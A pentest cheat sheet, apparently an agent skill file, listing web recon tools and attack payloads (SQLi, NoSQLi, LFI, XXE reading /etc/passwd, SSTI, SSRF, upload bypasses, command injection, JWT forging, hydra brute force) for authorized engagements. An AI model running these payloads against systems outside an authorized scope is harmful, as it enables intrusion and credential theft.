---
name: web-arsenal
description: >
  One line: web enumeration + exploitation tool arsenal for authorized engagements. Trigger signals:
  port 80/443/8080/8443 open, "web", a URL to a lab target, an HTTP service surfaced by recon.
  Authorized, in-scope targets only.
domain: web
type: arsenal
stability: locked
modes: [pentest, bugbounty]
schema_version: 1
---

# Web enumeration & exploitation arsenal

Authorized, in-scope targets only. Add `target.tld` to `/etc/hosts` first; many
apps only respond to their vhost name, not the raw IP.

## 1. Fingerprint (what am I looking at)
**whatweb** — fastest first look; identifies CMS/server/framework in one shot.
`whatweb -a3 http://target.tld` — `-a3` = aggressive plugins (more detail, more requests).
**httpx** — best for triaging many hosts/vhosts at once.
`httpx -title -tech-detect -status-code -u http://target.tld` — title + tech stack + code.
**curl** — ground truth; no interpretation between you and the bytes.
`curl -sI http://target.tld` — `-s` silent, `-I` headers only (Server, redirects, cookies).
`curl -s -H 'Host: dev.target.tld' http://target.tld/` — hit a vhost without editing hosts.
Gotcha: `-I` sends HEAD; some apps 405/behave differently — use `curl -s ... -o /dev/null -D -` for a real GET with headers.
**Wappalyzer** — browser extension; confirms JS frameworks curl can't see rendered.
**nikto** — noisy misconfig/known-file scanner; good on legacy targets, useless stealth.
`nikto -h http://target.tld` — Gotcha: hammers the server; run once, not in a loop.

## 2. Content discovery (find hidden paths)
**feroxbuster** — recursive by default, fast; the go-to for dir busting.
`feroxbuster -u http://target.tld -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html`
`-x` = extensions to append. Gotcha: use `--dont-scan` / `-d 1` to cap recursion depth on huge sites.
**ffuf** — most flexible; use when you need precise filtering.
`ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://target.tld/FUZZ -e .php,.txt -ac`
`-ac` = auto-calibrate (learn+filter the 404/wildcard page). Manual filters: `-fc 403` (code), `-fs 4242` (size), `-fw` (words).
**gobuster dir** — simple and reliable when ferox/ffuf misbehave.
`gobuster dir -u http://target.tld -w /usr/share/dirb/common.txt -x php,txt`
**dirsearch** — sane defaults + built-in extension logic.
`dirsearch -u http://target.tld -e php,html,txt`
**Vhost / subdomain fuzz** — name-based virtual hosts hide whole apps behind one IP.
`ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://target.tld/ -H 'Host: FUZZ.target.tld' -ac`
Gotcha: filter by size/words (`-fs`) — the default vhost answers everything with 200; you want the *different* size.

## 3. Parameter discovery (hidden inputs)
**ffuf param fuzz** — find GET/POST params the UI never exposes.
`ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://target.tld/page.php?FUZZ=1' -fs 0`
**arjun** — purpose-built param miner, understands JSON/form/query.
`arjun -u http://target.tld/api/endpoint` — Gotcha: add `-m POST` / `-m JSON` when GET finds nothing.
**x8** — thorough hidden-param brute with size-diff heuristics.
`x8 -u http://target.tld/ -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt`

## 4. Crawling (map the app + harvest endpoints)
**katana** — modern, fast, does JS-aware crawling.
`katana -u http://target.tld -jc -d 3` — `-jc` parse JS for endpoints, `-d` depth.
**hakrawler** — lightweight, pipe-friendly.
`echo http://target.tld | hakrawler -d 2`
**gospider** — good at pulling links out of JS/sitemaps/robots.
`gospider -s http://target.tld -d 2 -c 5`

## 5. Known-vuln scanning
**nuclei** — templated CVE/misconfig checks; run after you know the tech.
`nuclei -u http://target.tld -tags cve,exposure -severity high,critical`
Gotcha: `-t` a specific template dir once you've fingerprinted, e.g. `-t http/cves/2021/` — full run is loud and slow.
**searchsploit** — offline Exploit-DB lookup from your fingerprint.
`searchsploit apache tomcat 9` — `searchsploit -m <id>` mirrors the exploit locally.
**wpscan** — the WordPress standard.
`wpscan --url http://target.tld --enumerate u,vp,vt --api-token <TOKEN>`
`u` users, `vp` vuln plugins, `vt` vuln themes; token unlocks the vuln DB.
**joomscan** — Joomla enum. `joomscan --url http://target.tld`
**droopescan** — Drupal/SilverStripe/etc. `droopescan scan drupal -u http://target.tld`

## 6. Injection & common web vulns
**SQLi** — `sqlmap -u 'http://target.tld/item?id=1' --batch --dbs` (`--batch` = no prompts). Point at a saved
Burp request: `sqlmap -r req.txt --level 5 --risk 3`. Manual first: `'`, `' OR 1=1-- -`, `' UNION SELECT NULL-- -`.
**NoSQLi** — operator injection on JSON/form auth: `{"user":"admin","pass":{"$ne":null}}` or `user[$ne]=x&pass[$ne]=x`.
JS eval sink → `$where`/`;return true`. Extract via regex: `pass[$regex]=^a`.
**LFI / path traversal** — `ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u 'http://target.tld/?file=FUZZ'`.
Read source not exec: `php://filter/convert.base64-encode/resource=index.php`. Log-poison → RCE, `/etc/passwd` to confirm.
**SSTI** — detect with `{{7*7}}` / `${7*7}` / `<%= 7*7 %>`; a `49` means injection. Fingerprint the engine, then `tplmap -u 'http://target.tld/?name=*'` for auto-exploit.
**SSRF** — test `?url=http://127.0.0.1/`; escalate to internal services. Redis/gopher chain → see `tech-gopher-redis-rce`. File read: `file:///etc/passwd`.
**XXE** — POST XML with a DTD: `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`; use `php://filter` if the value is XML-parsed but not echoed cleanly.
**File upload bypass** — double ext `shell.php.jpg`, null/case `.pHp`/`.phtml`, magic-byte + `Content-Type: image/png`, `.htaccess` to map a new handler.
**Command injection** — chain operators on any exec sink: `; id`, `| id`, `$(id)`, `` `id` ``, newline `%0aid`; blind → `; ping -c1 <you>` and watch tcpdump.

## 7. Auth / session
**jwt_tool** — inspect and forge JWTs. `jwt_tool <token>` to decode; `jwt_tool <token> -X a` for alg:none;
`-C -d wordlist` to crack a weak HS256 secret. jwt.io for quick manual edits.
Crack the secret with hashcat: `hashcat -m 16500 token.jwt /usr/share/wordlists/rockyou.txt` (mode 16500 = JWT/HS256), then re-sign.
**hydra** — HTTP-form brute, authorized targets only.
`hydra -l admin -P rockyou.txt target.tld http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid'`
`F=` the failure string. Gotcha: get the exact POST body + failure text from Burp first, or every attempt "succeeds."

## 8. Proxy (manual work)
**Burp Suite** — intercept, Repeater for hand-crafting requests, Intruder for targeted fuzz. The core manual tool.
**mitmproxy** — scriptable/CLI alternative. `mitmproxy -p 8080` then point the browser/tooling at it.

## Discipline
- Prefer manual verification (curl/Burp Repeater) over scanner output — one confirmed request beats a page of maybes.
- Vhost ≠ subdirectory: a vhost is name-based, needs a `Host:` header or `/etc/hosts` entry; a subdir is just a path. Fuzz both.
- Pick the wordlist to the tech: raft/directory-list for general, CMS-specific lists once fingerprinted, LFI/param lists for their job.
- Read the JS — client bundles leak API routes, param names, and hidden endpoints no dir-buster will find. `katana -jc` then grep the bundles.
